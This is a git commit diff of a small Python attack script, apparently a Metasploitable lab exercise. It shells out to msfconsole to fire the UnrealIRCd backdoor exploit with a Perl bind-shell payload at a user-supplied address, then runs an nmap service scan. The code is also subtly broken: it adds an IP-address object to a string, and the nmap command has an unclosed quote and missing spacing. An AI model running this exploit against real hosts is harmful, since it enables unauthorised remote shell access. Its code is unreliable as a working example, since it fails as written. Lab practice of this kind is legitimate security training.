6edc65570d33940ebf155de99bb233e8801a3670
Ajsensai <74993492+Ajsensai@users.noreply.github.com>
2021-01-31 19:59:59 +1100

    Update attacktool.py

--- attacktool.py
+++ attacktool.py
@@ -2,17 +2,19 @@ import os
 import ipaddress
 
 def unreal_backdoor():
-    h = ipaddress.ip_address(input('Please enter the address of metasploitable: '))
-    print("Starting exploit against", h)
-    command = "msfconsole -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor;set RHOSTS " + h + ";set payload cmd/unix/bind_perl;exploit'"
+    h = input('Please enter the address of metasploitable: ')
+    y = ipaddress.ip_address(h)
+    print("Starting exploit against", y)
+    command = "msfconsole -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor;set RHOSTS " + y + ";set payload cmd/unix/bind_perl;exploit'"
     os.system(command)
 
 unreal_backdoor()
 
 def nmap():
-    h = ipaddress.ip_address(input('Please enter the address of metasploitable: '))
-    print("Starting exploit against", h)
-    command = "msfconsole -x 'nmap -v -sV" + h
+    h = input('Please enter the address of metasploitable: ')
+    y = ipaddress.ip_address(h)
+    print("Starting exploit against", y)
+    command = "msfconsole -x 'nmap -v -sV" + y
     os.system(command)
 
 nmap()
